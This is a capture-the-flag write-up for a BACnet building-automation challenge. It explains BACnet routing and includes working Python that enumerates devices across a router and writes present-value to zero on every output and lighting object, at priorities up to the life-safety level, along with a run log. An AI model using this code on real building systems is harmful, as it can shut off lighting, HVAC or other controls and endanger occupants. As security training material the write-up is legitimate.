# Nightfall — Writeup

**Category:** ICS / BACnet
**Flag:** delivered after killing all 12 lighting sectors on BACnet network 2001.

---

## Going in

ICS/BACnet things newer folks should know:

- **BACnet** is the building-automation protocol — lights, HVAC, fire panels, etc. Normally runs over UDP/47808.
- **BACnet/IP** wraps BACnet in IP. The on-wire structure is `[BVLC header][NPDU routing info][APDU command]`.
- **Routing** in BACnet is done by setting fields in the NPDU. To reach a device on a different "network number" you set `dnet` (destination network) and the router on the boundary forwards.
- **`Who-Is` / `I-Am`** is the discovery dance. Broadcast a Who-Is, devices respond with I-Am announcing themselves.
- **`ReadProperty` / `WriteProperty`** are the workhorses — read or write a single property (like `present-value`) of a single object (like a lighting-output).
- **Priority arrays** — BACnet outputs have 16 priority slots. You write to a slot; the controller acts on the highest non-null priority. Priority 1 (Manual-Life-Safety) overrides everything else.

The whole challenge is "speak BACnet over a TCP tunnel and turn off some lights".

---

## What you get

Two Docker services:

| Port | Service |
|---|---|
| `154.57.164.81:31613` | BACnet/IP router (TCP-wrapped) |
| `154.57.164.81:30446` | SecurityView Pro — 12-camera dashboard (visual feedback) |

Plus `note.md` (architecture diagram) and `udp2tcp.py` (the UDP-over-TCP forwarder).

### The architecture

```
[Player] ── TCP 47808 ──► [TCP Proxy]
                              │
                         [Network 1001]    (BACnet Router)
                              │
                         [Network 2001]    (12 Lights)
```

Router lives on network 1001 and is reachable through a TCP socket. Behind it on network 2001 are the 12 targets. The TCP framing wraps each BACnet datagram with a **2-byte big-endian length prefix**.

Camera dashboard at `:30446` shows 12 live feeds (CAM-01 through CAM-12). When the lights go dark, the feeds go dark — that's the visual confirmation loop.

---

## Path I didn't take

The obvious move is to grab `bacpypes3` and call its routing API. I tried. The `add_router_references` / `set_router_info` / `update_router_info` functions don't exist in the version that was installed, and digging through the source to figure out what version actually has them was going to cost more time than just writing the packets by hand.

Once you understand the framing, BACnet is small enough to build raw.

---

## What the exploit has to do

1. Connect directly to the TCP tunnel. No separate UDP bridge needed.
2. **Who-Is** with `dnet=2001` in the NPDU. The router broadcasts onto network 2001, devices respond, router forwards back.
3. **ReadProperty** the `object-list` of each device → enumerate every object inside.
4. **WriteProperty** `present-value = 0` on every output/lighting object found, at escalating priorities (8 → 6 → 3 → 1).

---

## Routing through the NPDU

To reach a remote network through a BACnet router, you need just four bytes in the NPDU:

```
NPDU control = 0x20    # destination present
dnet         = 2001    # destination network
dlen         = 0x00    # 0 means "broadcast on destination network"
hop count    = 0xff
```

The router reads that header, drops the packet onto network 2001 as a broadcast, and forwards the I-Am responses back to me through the same TCP socket.

---

## The exploit

The full encoder is ~50 lines. Helpers for the BACnet tag system:

```python
def enc_ctx_obj_id(ctx, t, i):
    return bytes([(ctx<<4)|0x0c]) + struct.pack("!I", (t<<22)|i)
def enc_ctx_uint(ctx, v):
    return bytes([(ctx<<4)|0x19, v]) if v < 256 else bytes([(ctx<<4)|0x1a])+struct.pack("!H",v)
def enc_app_real(v):  return bytes([0x44]) + struct.pack("!f", v)
def enc_app_enum(v):  return bytes([0x91, v])
def enc_app_uint(v):  return bytes([0x21, v]) if v < 256 else bytes([0x22])+struct.pack("!H",v)

def npdu_routed(dnet, dadr=None):
    n = bytes([0x01, 0x20]) + struct.pack("!H", dnet)
    n += bytes([0x00]) if dadr is None else bytes([len(dadr)]) + dadr
    return n + bytes([0xff])

def frame(payload):
    p = bytes([0x81, 0x0a]) + struct.pack("!H", 4+len(payload)) + payload
    return struct.pack("!H", len(p)) + p     # outer TCP length prefix
```

Packet builders:

```python
def pkt_who_is():
    return frame(npdu_routed(TARGET_NET) + bytes([0x10, 0x08]))

def pkt_read(iid, inst, dnet, dadr):
    a  = bytes([0x00, 0x04, iid, 0x0c])
    a += enc_ctx_obj_id(0, 8, inst) + enc_ctx_uint(1, 76)   # property 76 = object-list
    return frame(npdu_routed(dnet, dadr) + a)

def pkt_write(iid, ot, oi, val, pri, dnet, dadr):
    a  = bytes([0x00, 0x04, iid, 0x0f])
    a += enc_ctx_obj_id(0, ot, oi) + enc_ctx_uint(1, 85)    # property 85 = present-value
    a += bytes([0x3e])
    a += (enc_app_real(val) if isinstance(val,float)
          else enc_app_enum(val) if ot in (4,5) else enc_app_uint(val))
    a += bytes([0x3f]) + enc_ctx_uint(4, pri)
    return frame(npdu_routed(dnet, dadr) + a)
```

The object types I write to:

```python
KILLABLE = {
    1:  ("analog-output",      0.0),
    2:  ("analog-value",       0.0),
    4:  ("binary-output",      0),
    5:  ("binary-value",       0),
    14: ("multi-state-output", 1),
    54: ("lighting-output",    0.0),
}
```

The driver loop is just `for each device → ReadProperty(object-list) → for each output object → WriteProperty(present-value, 0, priority=8)`.

---

## Run

```
$ python3 nightfall.py
[+] TCP connected to 154.57.164.81:31613

[*] Who-Is → network 2001
   [I-Am] device,2001 ... device,2012
[+] 12 device(s) on net 2001

=== device,2001  net=2001 ===
   12 objects, types: {54}        # lighting-output
   ✓ lighting-output,1 → off  (priority 8)
   ...
   ✓ lighting-output,12 → off  (priority 8)

  Lights killed : 12
  Write failures: 0

[*] Probing cam server for flag...
   [+] /api/alerts → {"flag": "..."}
```

As each write lands, the corresponding camera feed in SecurityView goes black.

---

## Lessons

- **Don't fight the library.** If a routing API isn't where the docs say it is, you have a choice: spend an hour pinning the right version, or spend twenty minutes building packets by hand. For a one-shot CTF script, hand-rolling wins.
- **Read the framing first.** `udp2tcp.py` was the whole key. Once I understood the 2-byte length prefix, the "I need a separate tunnel process" idea evaporated — one TCP socket with that prefix is all you need.
- **BACnet routing is just a header.** Setting `dnet=2001, dlen=0, hops=0xff` does the entire job. The complexity in BACnet libraries is mostly about *abstracting* this away.
- **Use a visual feedback loop when one is available.** The camera dashboard let me confirm writes were taking effect in real time without parsing acknowledgements.
